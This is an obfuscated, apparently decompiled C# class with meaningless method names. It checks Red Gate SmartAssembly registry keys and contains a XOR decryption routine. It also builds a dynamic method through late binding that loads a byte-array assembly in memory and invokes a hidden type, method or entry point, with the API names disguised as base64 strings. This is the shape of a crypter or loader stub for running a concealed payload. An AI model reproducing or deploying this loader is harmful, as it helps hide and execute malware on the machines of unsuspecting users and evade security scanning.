using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns2;

namespace ns0;

internal class Class1
{
	static string smethod_0()
	{
		return "Software\\Wow6432Node\\Red Gate\\" + Class1.smethod_2();
	}

	static string smethod_1()
	{
		return "SmartAssembly";
	}

	static string smethod_2()
	{
		return "SmartAssembly" + " " + Class1.smethod_9();
	}

	static string smethod_3(string string_0)
	{
		return Encoding.UTF8.GetString(Convert.FromBase64String(string_0));
	}

	static void smethod_4(byte[] byte_0, byte[] byte_1)
	{
		object[] array = new object[1] { byte_1 };
		object[] object_ = array;
		string string_ = "SOadrNPYidH.uqfzqguFnn";
		string string_2 = "WaBolfxuSnM";
		Class1.smethod_8(object_, byte_0, string_2, string_);
	}

	unsafe static byte[] smethod_5(byte[] byte_0, string string_0)
	{
		void* ptr = stackalloc byte[16];
		byte[] bytes = Encoding.Default.GetBytes(string_0);
		*(int*)ptr = byte_0[checked(byte_0.Length - 1)] ^ 0x70;
		byte[] array = new byte[checked(byte_0.Length + 1)];
		byte* num = (byte*)ptr + 8;
		*(int*)((byte*)ptr + 12) = checked(byte_0.Length - 1);
		*(int*)num = 0;
		checked
		{
			while (unchecked(*(int*)((byte*)ptr + 8) <= *(int*)((byte*)ptr + 12)))
			{
				array[*unchecked((int*)((byte*)ptr + 8))] = (byte)unchecked(byte_0[*(int*)((byte*)ptr + 8)] ^ *(int*)ptr ^ bytes[*(int*)((byte*)ptr + 4)]);
				if (*unchecked((int*)((byte*)ptr + 4)) == string_0.Length - 1)
				{
					*unchecked((int*)((byte*)ptr + 4)) = 0;
				}
				else
				{
					(*unchecked((int*)((byte*)ptr + 4)))++;
				}
				(*unchecked((int*)((byte*)ptr + 8)))++;
			}
			return (byte[])Utils.CopyArray((Array)array, (Array)new byte[byte_0.Length - 2 + 1]);
		}
	}

	static bool smethod_6()
	{
		return Class3.smethod_0();
	}

	static string smethod_7()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class1.smethod_10());
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Class1.smethod_0());
			}
			if (registryKey == null)
			{
				return null;
			}
			string result = (string)registryKey.GetValue("Path", null);
			registryKey.Close();
			return result;
		}
		catch
		{
			return null;
		}
	}

	static object smethod_8(object[] object_0, byte[] byte_0, string string_0, string string_1)
	{
		object obj = new DynamicMethod(Class1.smethod_3("dG1w"), typeof(object), new Type[4]
		{
			typeof(byte[]),
			typeof(object[]),
			typeof(string),
			typeof(string)
		});
		object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "GetILGenerator", new object[0], (string[])null, (Type[])null, (bool[])null));
		object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "DefineLabel", new object[0], (string[])null, (Type[])null, (bool[])null));
		NewLateBinding.LateCall(objectValue, (Type)null, "DeclareLocal", new object[1] { typeof(Assembly) }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Call,
			typeof(Assembly).GetMethod(Class1.smethod_3("TG9hZA=="), new Type[1] { typeof(byte[]) }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Stloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_2 }, (string[])null, (Type[])null, (bool[])null, true);
		object[] array = new object[2]
		{
			OpCodes.Brfalse_S,
			RuntimeHelpers.GetObjectValue(objectValue2)
		};
		object[] array2 = array;
		bool[] array3 = new bool[2] { false, true };
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", array2, (string[])null, (Type[])null, array3, true);
		if (array3[1])
		{
			objectValue2 = RuntimeHelpers.GetObjectValue(array[1]);
		}
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_3 }, (string[])null, (Type[])null, (bool[])null, true);
		object[] array4 = new object[2]
		{
			OpCodes.Brfalse_S,
			RuntimeHelpers.GetObjectValue(objectValue2)
		};
		object[] array5 = array4;
		array3 = new bool[2] { false, true };
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", array5, (string[])null, (Type[])null, array3, true);
		if (array3[1])
		{
			objectValue2 = RuntimeHelpers.GetObjectValue(array4[1]);
		}
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_2 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(Assembly).GetMethod(Class1.smethod_3("R2V0VHlwZQ=="), new Type[1] { typeof(string) }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_3 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(Type).GetMethod(Class1.smethod_3("R2V0TWV0aG9k"), new Type[1] { typeof(string) }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldnull }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_1 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(MethodBase).GetMethod(Class1.smethod_3("SW52b2tl"), new Type[2]
			{
				typeof(object),
				typeof(object[])
			}),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ret }, (string[])null, (Type[])null, (bool[])null, true);
		array4 = new object[1] { RuntimeHelpers.GetObjectValue(objectValue2) };
		object[] array6 = array4;
		array3 = new bool[1] { true };
		NewLateBinding.LateCall(objectValue, (Type)null, "MarkLabel", array6, (string[])null, (Type[])null, array3, true);
		if (array3[0])
		{
			objectValue2 = RuntimeHelpers.GetObjectValue(array4[0]);
		}
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(Assembly).GetProperty(Class1.smethod_3("RW50cnlQb2ludA=="))!.GetGetMethod(),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldnull }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_1 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(MethodBase).GetMethod(Class1.smethod_3("SW52b2tl"), new Type[2]
			{
				typeof(object),
				typeof(object[])
			}),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ret }, (string[])null, (Type[])null, (bool[])null, true);
		return NewLateBinding.LateGet(obj, (Type)null, "Invoke", new object[2]
		{
			null,
			new object[4] { byte_0, object_0, string_1, string_0 }
		}, (string[])null, (Type[])null, (bool[])null);
	}

	static int smethod_9()
	{
		Version version = new Version("6.8.0.121");
		return version.Major;
	}

	static string smethod_10()
	{
		return "Software\\Red Gate\\" + Class1.smethod_2();
	}
}
